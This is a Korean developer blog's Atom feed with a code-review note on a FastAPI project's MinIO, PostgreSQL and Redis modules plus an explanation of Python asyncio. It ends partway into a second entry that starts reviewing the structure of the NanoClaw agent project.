<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" hreflang="ko" /><updated>2026-02-14T07:42:39+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Paul’s Archives</title><subtitle>성장하는 개발자, 소통하는 개발자, 빠른 적용을 최 우선으로 삼는 개발자. 다음을 항상 생각하며, 개발 속에서 가치를 만들어내는 것을 목표로 합니다.</subtitle><author><name>Paul2021-R</name></author><entry><title type="html">Protostar review note - 03 - FastAPI DBs</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review.html" rel="alternate" type="text/html" title="Protostar review note - 03 - FastAPI DBs" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/00-protostar-review.html"><![CDATA[<h2 id="coreminio_clientpy">core/minio_client.py</h2>

<p>이 모듈은 MinIO 오브젝트 스토리지와의 연결을 관리하고 파일을 다운로드하는 래퍼(Wrapper) 클래스를 정의하고 있다.</p>

<h3 id="1-코드-분석-및-개념">1. 코드 분석 및 개념</h3>

<ul>
  <li><code class="language-plaintext highlighter-rouge">__init__</code>: 설정값(endpoint, access_key 등)을 가져와 동기식 <code class="language-plaintext highlighter-rouge">Minio</code> 클라이언트 객체를 초기화한다.</li>
  <li><code class="language-plaintext highlighter-rouge">check_connection</code>: 서버 시작 시 버킷이 존재하는지 확인하여 연결 상태를 로깅한다. 동기 함수인 <code class="language-plaintext highlighter-rouge">bucket_exists</code>를 <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>로 감싸서 실행한다.</li>
  <li><code class="language-plaintext highlighter-rouge">get_file_content</code>: 지정된 버킷에서 객체를 읽어 바이트 배열로 반환한다. 이 역시 I/O 블로킹을 막기 위해 <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>를 사용하여 별도의 스레드에서 <code class="language-plaintext highlighter-rouge">get_object</code>와 <code class="language-plaintext highlighter-rouge">read()</code>를 수행한다.</li>
  <li><strong>개념 (비동기 오프로딩):</strong> 파이썬의 <code class="language-plaintext highlighter-rouge">asyncio</code> 환경에서 동기 라이브러리(MinIO SDK)가 메인 이벤트 루프를 블로킹하는 것을 방지하기 위해 <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>를 사용한다. 이는 무거운 I/O 작업을 백그라운드 스레드 풀로 넘겨 비동기적으로 결과를 기다리는 기법이다.</li>
</ul>

<h3 id="2-대체-가능한-라이브러리-및-메서드">2. 대체 가능한 라이브러리 및 메서드</h3>

<p>동기식 <code class="language-plaintext highlighter-rouge">minio</code> 라이브러리를 스레드로 래핑하는 대신, 처음부터 비동기를 지원하는 <strong><code class="language-plaintext highlighter-rouge">aioboto3</code></strong> 라이브러리를 사용할 수 있다. AWS S3 호환 스토리지를 비동기로 다루는 표준적인 방법이다.</p>

<h3 id="3-트레이드오프-trade-off">3. 트레이드오프 (Trade-off)</h3>

<ul>
  <li><strong>현재 방식 (<code class="language-plaintext highlighter-rouge">minio</code> + <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>):</strong> 공식 MinIO 라이브러리를 사용하므로 API 문서 참고와 구현이 매우 직관적이고 쉽다. 하지만 요청이 많아질 경우 스레드 컨텍스트 스위칭 오버헤드가 발생하며, 진정한 의미의 Non-blocking I/O 성능을 100% 발휘하지 못한다.
    <ul>
      <li>Why:
        <ul>
          <li>공식 MinIO 라이브러리를 사용한 이유가 여기에 있다. 기본적으로 원본 데이터는 최초 다운로드 받는 정도이며, 모든 비즈니스 로직은 NestJS 가 이를 대응함.</li>
          <li>결과적으로 이후엔 RAG 기반으로 변환한 데이터를 pgVector 기반으로 대응하므로, 현재의 방식으로 하더라도 스레드 컨텍스트 스위칭 오버헤드가 발생하더라도 큰 문제가 없음.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong>대체 방식 (<code class="language-plaintext highlighter-rouge">aioboto3</code>):</strong> 완전한 비동기 I/O를 지원하므로 대규모 동시성 처리에 매우 효율적이다. 하지만 Boto3 기반이므로 MinIO에 특화된 기능 접근이 까다로울 수 있고, 러닝 커브가 존재한다. 따라서 구체적으로 더 다양한 작업들이 이어진다면 해당 기능을 활용해야 하며 특히 S3 등을 쓴다면 더욱 그러하다.</li>
</ul>

<h3 id="4-구조적-취약점-및-개선-방향">4. 구조적 취약점 및 개선 방향</h3>

<ul>
  <li><strong>취약점:</strong> <code class="language-plaintext highlighter-rouge">get_file_content</code> 내에서 <code class="language-plaintext highlighter-rouge">response.read()</code>를 호출하여 파일 전체를 한 번에 메모리에 올린다. 대용량 파일을 요청할 경우 서버 I/O 병목 및 메모리 고갈(OOM, Out Of Memory)이 발생할 위험이 크다.
    <ul>
      <li>현 상황에서 사용하는 파일 자료가 md 텍스트 파일로 제한되어 있기 때문에 넘어갔음.</li>
    </ul>
  </li>
  <li><strong>개선 방향:</strong> 대용량 파일 처리, 파일 종류에 따라 OOM 방지를 위해 전체 데이터를 메모리에 올리지 않고 <strong>청크(Chunk) 단위의 스트리밍 반환 구조</strong>로 개선해야 한다. (자세한 내용 요청 시 응답 가능)</li>
</ul>

<hr />

<h2 id="coredatabasepy">core/database.py</h2>

<p>PostgreSQL 데이터베이스와의 비동기 연결 및 ORM 세션을 설정하는 모듈이다.</p>

<h3 id="1-코드-분석">1. 코드 분석</h3>

<ul>
  <li><code class="language-plaintext highlighter-rouge">engine</code> 및 <code class="language-plaintext highlighter-rouge">AsyncSessionLocal</code>: 비동기 처리용 <code class="language-plaintext highlighter-rouge">create_async_engine</code>을 활용하여 커넥션 풀(pool_size=10, max_overflow=20)을 구성하고 세션 팩토리를 만든다.</li>
  <li><code class="language-plaintext highlighter-rouge">init_db()</code>: 애플리케이션 시작 시 호출되어 모델을 임포트하고, <code class="language-plaintext highlighter-rouge">create_all</code>을 통해 데이블을 강제 생성한다. 에러 발생 시 <code class="language-plaintext highlighter-rouge">sys.exit(1)</code>로 서버를 종료한다.</li>
  <li><code class="language-plaintext highlighter-rouge">get_db()</code>: FastAPI의 의존성 주입(Dependency Injection)에 사용될 제너레이터(Generator)로, 세션을 열고 안전하게 닫거나 롤백하는 라이프사이클을 관리한다.</li>
</ul>

<h3 id="2-대체-가능한-라이브러리-및-메서드-1">2. 대체 가능한 라이브러리 및 메서드</h3>

<p>현재 <strong><code class="language-plaintext highlighter-rouge">SQLAlchemy</code></strong> ORM을 사용 중인데, 대체제로 <strong><code class="language-plaintext highlighter-rouge">Prisma Client Python</code></strong> 또는 ORM을 배제한 순수 비동기 드라이버인 <strong><code class="language-plaintext highlighter-rouge">asyncpg</code></strong>를 직접 사용할 수 있다.</p>

<h3 id="3-트레이드오프-trade-off-1">3. 트레이드오프 (Trade-off)</h3>

<ul>
  <li><strong>SQLAlchemy ORM:</strong> 매우 강력하고 파이썬 생태계의 표준 격이라 호환성이 좋으나, 매핑 오버헤드로 인해 순수 드라이버보다 속도가 다소 느리다. DB의 중요성, 트랜잭션 퍼포먼스의 우선도가 떨어지는 일반적인 서비스의 경우 사용이 편리함.</li>
  <li><strong>asyncpg:</strong> 파이썬 DB 드라이버 중 압도적으로 빠르지만, 모든 쿼리를 날(Raw) SQL 스트링으로 관리해야 하므로 생산성과 유지보수성이 급격히 떨어진다. DB가 특성적으로 매우 중요한 서비스라면 이렇게 가고 Raw SQL 을 이용하는게 좋을 수 있다.</li>
</ul>

<h3 id="4-구조적-취약점-및-개선-방향-1">4. 구조적 취약점 및 개선 방향</h3>

<ul>
  <li><strong>취약점:</strong> <code class="language-plaintext highlighter-rouge">init_db</code>에서 <code class="language-plaintext highlighter-rouge">Base.metadata.create_all</code>을 사용하고 있으며 연결 실패 시 <code class="language-plaintext highlighter-rouge">sys.exit(1)</code>로 서버를 다운시킨다. 프로덕션 환경에서는 테이블 변경 이력 관리가 안 되며, 일시적인 네트워크 장애에도 컨테이너가 죽어버리는 결함이 발생할 수 있다.</li>
  <li><strong>개선 방향:</strong>
    <ul>
      <li>프로덕션 스키마 관리를 위해 <code class="language-plaintext highlighter-rouge">create_all</code> 대신 <strong>Alembic 마이그레이션 툴</strong>을 도입하는게 유효할 수 있다.</li>
      <li><code class="language-plaintext highlighter-rouge">init_db</code>에 데이터베이스 연결 <strong>재시도(Backoff Retry) 로직</strong>을 추가해야 한다.</li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="coreredispy">core/redis.py</h2>

<p>인메모리 데이터 저장소인 Redis와의 비동기 연결 풀을 구성하고 클라이언트 객체를 제공하는 모듈이다.</p>

<h3 id="1-코드-분석-및-개념-1">1. 코드 분석 및 개념</h3>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pool</code>: <code class="language-plaintext highlighter-rouge">redis.ConnectionPool.from_url</code>을 사용해 최대 1000개의 연결을 유지할 수 있는 비동기 커넥션 풀을 생성한다.</li>
  <li><code class="language-plaintext highlighter-rouge">get_redis_client()</code>: 생성된 풀을 기반으로 <code class="language-plaintext highlighter-rouge">Redis</code> 인스턴스를 반환한다.</li>
  <li><code class="language-plaintext highlighter-rouge">init_test_redis()</code>: 서버 시작 단계에서 <code class="language-plaintext highlighter-rouge">ping()</code>을 날려 상태를 체크하고, 실패하면 자원 해제 후 <code class="language-plaintext highlighter-rouge">sys.exit(1)</code>로 프로세스를 종료한다.</li>
  <li><strong>개념 (In-memory DB):</strong> 모든 데이터를 디스크가 아닌 메모리에 저장하여 압도적인 읽기/쓰기 속도를 자랑한다. 세션 관리, 캐싱, 큐(Queue) 등 일시적이고 빠른 접근이 필요한 데이터 처리에 주로 쓰인다.</li>
</ul>

<h3 id="2-대체-가능한-라이브러리-및-메서드-2">2. 대체 가능한 라이브러리 및 메서드</h3>

<p>현재 사용 중인 <code class="language-plaintext highlighter-rouge">redis.asyncio</code>는 과거 <code class="language-plaintext highlighter-rouge">aioredis</code>가 병합된 공식 표준 라이브러리이므로 파이썬 생태계에서는 가장 최적의 선택이다. 저장소 수준에서 대체를 고려한다면 <strong><code class="language-plaintext highlighter-rouge">Memcached</code></strong>를 사용할 수 있지만, Redis 의 본래의 제공 기능을 위하여 최대한 공식 표준 라이브러리를 사용했다.</p>

<h3 id="3-트레이드오프-trade-off-2">3. 트레이드오프 (Trade-off)</h3>

<ul>
  <li><strong>Redis:</strong> 문자열, 리스트, 해시, 셋 등 다양한 자료구조를 지원하고 디스크 영속성(Persistence)을 부분 지원하나, 구조가 복잡해지면 메모리 파편화나 관리 비용이 증가한다.</li>
  <li><strong>Memcached:</strong> 단순한 키-값(Key-Value) 캐싱에는 오버헤드가 적어 아주 미세하게 더 빠르고 메모리 관리가 단순하지만, 다양한 자료구조를 활용할 수 없고 시스템 재시작 시 데이터가 100% 날아간다.</li>
</ul>

<h3 id="4-구조적-취약점-및-개선-방향-2">4. 구조적 취약점 및 개선 방향</h3>

<ul>
  <li><strong>취약점:</strong> <code class="language-plaintext highlighter-rouge">database.py</code>와 마찬가지로 <code class="language-plaintext highlighter-rouge">init_test_redis</code>에서 연결 예외 발생 시 <code class="language-plaintext highlighter-rouge">sys.exit(1)</code>로 강제 종료를 발생시킨다. Redis는 주로 캐싱 용도이므로 서버 전체가 죽어야 할 만큼의 치명적 장애가 아닐 수 있다 (Graceful degradation 부재).</li>
  <li><strong>개선 방향:</strong> Redis 연결 장애 시 애플리케이션을 강제 종료하는 대신, 기능을 우회(Fallback)하거나 <strong>지수 백오프(Exponential Backoff)를 활용한 재시도 구조</strong>로 안정성을 높여야 한다.</li>
</ul>

<p>앞서 작성된 <code class="language-plaintext highlighter-rouge">## core/redis.py</code> 문서의 후속 내용으로, 프로젝트 전체 아키텍처 관점에서 Redis가 어떻게 활용되고 있는지 분석한 5번 항목을 추가해 드립니다.</p>

<h3 id="5-protostar-프로젝트-전체에서의-redis-활용-부분-정리">5. Protostar 프로젝트 전체에서의 Redis 활용 부분 정리</h3>

<p>현재 프로젝트의 <code class="language-plaintext highlighter-rouge">core/redis.py</code>에서 생성된 비동기 Redis 클라이언트는 FastAPI 애플리케이션 전반에서 다음과 같은 핵심적인 역할을 수행한다.</p>

<ul>
  <li><strong>백그라운드 비동기 작업 큐 (Task Queue 및 Message Broker):</strong> FastAPI 웹 서버는 클라이언트의 요청에 대해 최대한 빠르게 응답해야 하므로, 실행 시간이 오래 걸리는 무거운 I/O 작업(예: LLM 기반의 AI 요약, RAG 문서 벡터화 연산 등)을 메인 이벤트 루프에서 직접 처리해서는 안 된다. 메인 API 서버(생산자)는 클라이언트 요청을 받으면 <strong>Redis 큐에 작업 명세(Task)를 밀어 넣고(Push) 즉시 응답을 반환(Fire and Forget)</strong>한다. 이후 <code class="language-plaintext highlighter-rouge">worker_knowledge.py</code>, <code class="language-plaintext highlighter-rouge">worker_summary.py</code> 등의 독립된 백그라운드 워커(소비자)들이 Redis에서 작업을 꺼내어(Pop) 비동기적으로 안전하게 처리하는 <strong>메시지 브로커(Message Broker)</strong> 역할을 수행한다.</li>
  <li><strong>분산 컴포넌트 간의 상태 공유 (State Management):</strong> API 서버(FastAPI)와 여러 워커 프로세스(AI/요약/지식 처리 등)가 서로 독립적인 컨테이너로 분리되어 동작하는 분산 환경에서, 각 작업의 진행 상태(예: 대기 중, 처리 중, 완료, 실패)나 임시 결과물 데이터를 실시간으로 빠르고 안전하게 주고받기 위한 <strong>중앙 인메모리 상태 저장소</strong>로 기능한다. 데이터베이스(PostgreSQL)에 매번 접근하는 것에 비해 압도적으로 빠른 속도를 보장한다.</li>
  <li><strong>데이터 캐싱 (Caching) 및 부하 분산:</strong> AI 모델이 생성한 요약 결과나 동일한 문서에 대한 반복적인 질의응답 처리 결과를 메모리에 일시적으로 저장(TTL 설정)해 두는 캐싱 용도로도 활용된다. 이를 통해 불필요한 연산과 데이터베이스 I/O를 줄여 전반적인 응답 속도를 극대화하고, 트래픽이 몰리는 상황(Spike)에서 시스템 후단 시스템의 부하를 효과적으로 경감시킨다.</li>
</ul>

<hr />

<h2 id="asyncio-및-코루틴coroutine-추가-정리">asyncio 및 코루틴(Coroutine) 추가 정리</h2>

<h3 id="1-비동기-논블로킹과-코루틴의-개념">1. 비동기 논블로킹과 코루틴의 개념</h3>

<p>비동기 프로그래밍을 명확히 이해하기 위해서는 패러다임과 이를 구현하는 도구를 구분해야 한다.</p>

<ul>
  <li><strong>비동기 논블로킹 (Async Non-blocking):</strong> I/O 작업(네트워크 요청, 파일 읽기 등) 시 결과를 마냥 기다리지 않고(Non-blocking), 제어권을 넘겨 다른 작업을 수행하다가 완료되면 다시 돌아와 처리하는(Async) <strong>프로그래밍 패러다임</strong>이다.</li>
  <li><strong>코루틴 (Coroutine):</strong> 파이썬에서 비동기 논블로킹 패러다임을 실제로 구현하기 위해 사용하는 <strong>특수한 함수 구조(도구)</strong> 이다. 일반 함수(Subroutine)와 달리 실행 도중 일시 정지(Pause/Yield)하고, 나중에 멈춘 지점부터 다시 재개(Resume)할 수 있는 특징을 가진다.</li>
</ul>

<h3 id="2-코루틴-객체와-await의-동작-원리">2. 코루틴 객체와 <code class="language-plaintext highlighter-rouge">await</code>의 동작 원리</h3>

<p><code class="language-plaintext highlighter-rouge">async def</code>로 정의된 함수를 호출하거나 비동기 래퍼 함수를 실행하면 즉시 작업이 실행되지 않는다.</p>

<ul>
  <li><strong>코루틴 객체 반환:</strong> 함수 호출 시 실제 결과값이 아닌, “나중에 실행될 작업 명세서(대기표)” 역할을 하는 <strong>코루틴(Coroutine) 객체</strong>가 반환된다.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">await</code> 키워드:</strong> 코루틴 객체 앞에 <code class="language-plaintext highlighter-rouge">await</code>를 붙여야만 이벤트 루프에 의해 실제 작업이 스케줄링 및 실행되며, 작업이 완료된 후 최종 결과값을 반환받을 수 있다.</li>
</ul>

<h3 id="3-asyncioto_thread를-활용한-동기-io-오프로딩">3. <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>를 활용한 동기 I/O 오프로딩</h3>

<p>FastAPI와 같은 비동기 프레임워크 환경에서 외부 라이브러리(예: MinIO SDK)의 동기식 블로킹 함수를 그대로 호출하면 메인 이벤트 루프가 멈추는 병목 현상이 발생함. 이를 해결하기 위해 <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>를 사용한다.</p>

<ul>
  <li><strong>역할:</strong> 무거운 동기 함수 호출을 백그라운드 스레드 풀(Thread Pool)로 넘겨서 실행하고, 메인 스레드는 블로킹 없이 다른 코루틴을 처리할 수 있게 한다.</li>
  <li><strong>반환 타입의 변화:</strong>
    <ol>
      <li><code class="language-plaintext highlighter-rouge">asyncio.to_thread(...)</code> 호출 직후: <code class="language-plaintext highlighter-rouge">&lt;class 'coroutine'&gt;</code> 타입을 반환한다.</li>
      <li><code class="language-plaintext highlighter-rouge">await asyncio.to_thread(...)</code> 실행 완료 후: 원본 동기 함수가 뱉어내는 <strong>본래의 데이터 타입</strong>(예: <code class="language-plaintext highlighter-rouge">bool</code>, <code class="language-plaintext highlighter-rouge">bytes</code>)을 그대로 반환한다.</li>
    </ol>
  </li>
</ul>

<h3 id="4-ide-타입-추론-한계-극복-type-annotation">4. IDE 타입 추론 한계 극복 (Type Annotation)</h3>

<p>외부 라이브러리(Boto3, MinIO 등)의 동기 함수를 <code class="language-plaintext highlighter-rouge">asyncio.to_thread</code>로 감쌀 때, 원본 라이브러리에 최신 파이썬 타입 힌트가 누락되어 있다면 IDE(VS Code 등)는 최종 반환 타입을 <code class="language-plaintext highlighter-rouge">unknown</code>이나 <code class="language-plaintext highlighter-rouge">Any</code>로 인식하여 자동완성을 지원하지 못한다.</p>

<ul>
  <li><strong>해결 방안:</strong> 개발자가 직접 반환 타입을 명시(Type Annotation)하여 가독성과 유지보수성을 높여야 한다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 명시적 타입 힌팅 적용 예시
</span><span class="n">found</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">to_thread</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">bucket_exists</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bucket_name</span><span class="p">)</span>
<span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">to_thread</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">read</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="5-nestjs-nodejs와-python-asyncio의-비동기-동작-방식-차이">5. NestJS (Node.js)와 Python <code class="language-plaintext highlighter-rouge">asyncio</code>의 비동기 동작 방식 차이</h3>

<p>비동기 함수를 다룰 때 파이썬과 Node.js(NestJS) 생태계는 근본적인 동작 방식에 큰 차이가 있다. 가장 핵심적인 차이는 비동기 함수를 호출했을 때 반환되는 객체의 실행 상태(Hot vs Cold)이다.</p>

<ul>
  <li><strong>NestJS (Node.js) 방식: “Hot Promise” 🔥</strong>
    <ul>
      <li><strong>동작 원리:</strong> Node.js 환경에서는 비동기 함수(<code class="language-plaintext highlighter-rouge">async function</code>)를 호출하는 그 즉시 내부 로직이 동기적으로 실행되기 시작한다 (함수 내부에서 첫 번째 <code class="language-plaintext highlighter-rouge">await</code>를 만날 때까지).</li>
      <li><strong>특징:</strong> 반환되는 <code class="language-plaintext highlighter-rouge">Promise</code> 객체는 이미 실행 중인(Hot) 상태이다. 따라서 <code class="language-plaintext highlighter-rouge">await</code> 키워드를 생략하고 함수를 호출만 해두어도(던져 놓기만 해도), 이벤트 루프가 이를 이미 인지하고 백그라운드에서 남은 작업을 알아서 처리한다.</li>
    </ul>
  </li>
  <li><strong>Python (<code class="language-plaintext highlighter-rouge">asyncio</code>) 방식: “Cold Coroutine” ❄️</strong>
    <ul>
      <li><strong>동작 원리:</strong> 파이썬에서는 비동기 함수(<code class="language-plaintext highlighter-rouge">async def</code>)를 호출하면, 실제 코드는 단 1%도 실행되지 않고 오직 “나중에 이 작업을 실행하겠다”는 작업 명세서인 <strong>코루틴(Coroutine) 객체</strong>만 반환한다.</li>
      <li><strong>특징:</strong> 반환된 코루틴은 아직 전혀 실행되지 않은(Cold) 상태이다. 파이썬의 이벤트 루프는 개발자가 명시적으로 큐에 등록해주기 전까지 이 코루틴 객체를 쳐다보지도 않는다.</li>
      <li><strong>주의점:</strong> <code class="language-plaintext highlighter-rouge">await</code> 없이 비동기 함수만 호출하고 방치하면 작업 자체가 아예 실행되지 않으며, 파이썬은 프로그램 종료 시 <code class="language-plaintext highlighter-rouge">RuntimeWarning: coroutine was never awaited</code>라는 경고 에러를 발생시킨다.</li>
    </ul>
  </li>
  <li><strong>핵심 요약 (Fire and Forget 패턴의 구현):</strong>
    <ul>
      <li>NestJS에서는 단순히 비동기 함수를 <code class="language-plaintext highlighter-rouge">await</code> 없이 호출하는 것만으로 백그라운드 실행(Fire and Forget)이 성립된다.</li>
      <li>하지만 파이썬에서 결과를 기다리지 않고 백그라운드에서 알아서 실행되게 하려면, 함수를 덩그러니 던져놓는 것이 아니라 반드시 <strong><code class="language-plaintext highlighter-rouge">asyncio.create_task(my_async_function())</code></strong>를 사용하여 이벤트 루프의 스케줄러에 명시적으로 밀어 넣어주어야 한다.</li>
    </ul>
  </li>
</ul>

<h2 id="sqlalchemy-라이브러리의-개념-및-주요-특징">SQLAlchemy 라이브러리의 개념 및 주요 특징</h2>

<p>본 문서는 파이썬 생태계에서 가장 널리 사용되는 데이터베이스 툴킷이자 ORM(Object-Relational Mapping) 라이브러리인 <strong>SQLAlchemy</strong>의 핵심 개념과 특징을 정리한 것이다. Protostar 프로젝트의 데이터베이스 연동(<code class="language-plaintext highlighter-rouge">core/database.py</code>)에도 핵심적으로 사용되었다.</p>

<h3 id="1-sqlalchemy란">1. SQLAlchemy란?</h3>

<p>SQLAlchemy는 파이썬 프로그램과 관계형 데이터베이스(RDBMS) 간의 소통을 돕는 강력한 SQL 툴킷이자 ORM 라이브러리이다.</p>

<h3 id="2-핵심-개념">2. 핵심 개념</h3>

<ul>
  <li><strong>ORM (Object-Relational Mapping):</strong> 데이터베이스의 ‘테이블’을 파이썬의 ‘클래스(Class)’로, 테이블의 ‘로우(Row/Record)’를 파이썬의 ‘인스턴스(Instance)’로 매핑하는 기술이다. 이를 통해 데이터베이스를 철저히 객체 지향적인 관점에서 다룰 수 있음. 편리함.</li>
  <li><strong>Engine (엔진):</strong> SQLAlchemy 애플리케이션의 심장부로, 데이터베이스와의 통신을 담당하는 기본 인터페이스. 내부적으로 커넥션 풀(Connection Pool)과 Dialect(데이터베이스 방언 해석기)를 관리하여, DB 연결을 효율적으로 재사용하고 각기 다른 DB(PostgreSQL, MySQL 등)의 문법 차이를 추상화한다.</li>
  <li><strong>Session (세션):</strong> ORM 객체들의 ‘작업 공간(Workspace)’이다. 데이터베이스 트랜잭션(Transaction)을 캡슐화하며, 세션 내에서 변경된 객체 상태를 추적하다가 <code class="language-plaintext highlighter-rouge">commit()</code>이 호출될 때 비로소 실제 DB에 반영(Flush)한다.</li>
  <li><strong>Declarative Base:</strong> 클래스 정의와 동시에 테이블 메타데이터를 생성해 주는 기본 클래스이다. 클래스 변수로 컬럼의 타입과 제약조건을 정의하면, SQLAlchemy가 이를 데이터베이스 스키마로 변환한다.</li>
</ul>

<h3 id="3-주요-특징-및-장단점-trade-off">3. 주요 특징 및 장단점 (Trade-off)</h3>

<p><strong>장점:</strong></p>
<ul>
  <li><strong>데이터베이스 독립성 (DB Agnostic):</strong> 엔진의 URL만 변경하면 코드 수정 없이 PostgreSQL, MySQL, SQLite 등 다른 데이터베이스로 쉽게 마이그레이션이 가능하다.</li>
  <li><strong>보안 (SQL Injection 방지):</strong> 내부적으로 쿼리를 파라미터화하여 실행하므로 SQL 인젝션 공격으로부터 매우 안전하다.</li>
  <li><strong>비동기(Asyncio) 지원:</strong> <code class="language-plaintext highlighter-rouge">sqlalchemy.ext.asyncio</code> 모듈을 통해 파이썬의 비동기 I/O 패러다임을 완벽히 지원한다. FastAPI와 같은 비동기 웹 프레임워크와 결합 시 훌륭한 시너지를 낸다.</li>
</ul>

<p><strong>단점 (트레이드오프):</strong></p>
<ul>
  <li><strong>학습 곡선(Learning Curve):</strong> 기능이 방대하고 구조가 복잡하여(Core와 ORM 계층의 분리 등) 초기 진입 장벽이 다소 높은 편이다.</li>
  <li><strong>성능 오버헤드:</strong> 파이썬 객체를 SQL로 번역하고, 결과를 다시 객체로 변환하는 매핑 과정이 존재하므로 순수 SQL 드라이버(예: <code class="language-plaintext highlighter-rouge">asyncpg</code>)나 가벼운 쿼리 빌더를 사용할 때보다 미세하게 속도가 느리고 메모리 사용량이 많다.</li>
</ul>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Project" /><category term="Review" /><category term="FastAPI" /><summary type="html"><![CDATA[core/minio_client.py]]></summary></entry><entry><title type="html">NanoClaw review note - 01 - NanoClaw Init</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/01-nano-claw-reverse-review.html" rel="alternate" type="text/html" title="NanoClaw review note - 01 - NanoClaw Init" /><published>2026-02-14T00:00:00+00:00</published><updated>2026-02-14T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/01-nano-claw-reverse-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/14/01-nano-claw-reverse-review.html"><![CDATA[<h2 id="0-why-this-project">0. Why this Project?</h2>
<ul>
  <li>본 프로젝트는 AI 응용 어플리케이션 구축에서 필요한 내용, agentic AI 구축을 위하여 필요한 것들에 대한 이해도를 높이고, 현재 진행중인 Nexus 프로젝트 이후 AI 기반의 서비스 구축 능력을 갖추기 위한 첫 도전이다.</li>
  <li>당장 무언가를 만들기보단, 잘 만들어진 예시를 기반으로 RAG 이상의 기능 구현을 어떤 식으로 접근하면 좋을지 사전 학습 겸 하여 진행하게 되었다.</li>
  <li><a href="https://github.com/Paul2021-R/nanoclaw-for-study">코드 레포지터리</a></li>
</ul>

<hr />

<h2 id="1-루트-디렉토리-전체-구조">1. 루트 디렉토리 전체 구조</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nanoclaw/
├── src/                   # 핵심 소스 코드
├── container/             # 컨테이너 빌드 &amp; 에이전트 런너
├── docs/                  # 아키텍처 문서
├── groups/                # 그룹별 격리 메모리
├── config-examples/       # 설정 예시 파일
├── launchd/               # macOS 서비스 데몬 설정
├── assets/                # 로고, 아이콘 등 정적 자산
├── .github/               # GitHub Actions &amp; PR 템플릿
├── package.json           # 프로젝트 의존성 &amp; 스크립트
├── tsconfig.json          # TypeScript 컴파일 설정
├── vitest.config.ts       # 테스트 프레임워크 설정
├── CLAUDE.md              # Claude AI에게 주는 프로젝트 맥락
├── README.md / README_zh.md  # 프로젝트 문서 (영어/중국어)
├── CONTRIBUTING.md        # 기여 가이드
└── LICENSE                # 라이선스 (MIT)
</code></pre></div></div>

<h3 id="src--핵심-애플리케이션-코드"><code class="language-plaintext highlighter-rouge">src/</code> — 핵심 애플리케이션 코드</h3>

<p>프로젝트의 심장부이다. 모든 비즈니스 로직이 여기에 모여 있다.</p>

<table>
  <thead>
    <tr>
      <th>파일</th>
      <th>역할</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">index.ts</code></td>
      <td>**오케스트레이터(Orchestrator)** — 상태 관리, 메시지 루프, 에이전트 호출을 총괄하는 진입점이다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">config.ts</code></td>
      <td>트리거 패턴, 경로, 인터벌, 타임아웃 등 **전역 설정값**을 관리한다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">router.ts</code></td>
      <td>메시지 포맷팅 및 **아웃바운드 라우팅**을 담당한다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">container-runner.ts</code></td>
      <td>Agent 컨테이너를 **스폰(Spawn)하고 마운트를 설정**하는 핵심 모듈이다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">ipc.ts</code></td>
      <td>호스트↔컨테이너 간 **IPC(프로세스 간 통신)** 감시 및 태스크 처리를 담당한다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">db.ts</code></td>
      <td>**SQLite** 기반의 데이터 관리 (대화 기록, 스케줄 등)를 수행한다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">task-scheduler.ts</code></td>
      <td>**cron/interval/once** 기반의 예약 작업 관리를 담당한다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">group-queue.ts</code></td>
      <td>그룹별 메시지 **큐(Queue)** 관리를 처리한다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">mount-security.ts</code></td>
      <td>컨테이너에 마운트할 경로의 **보안 검증** (allowlist/blocklist)을 수행한다</td>
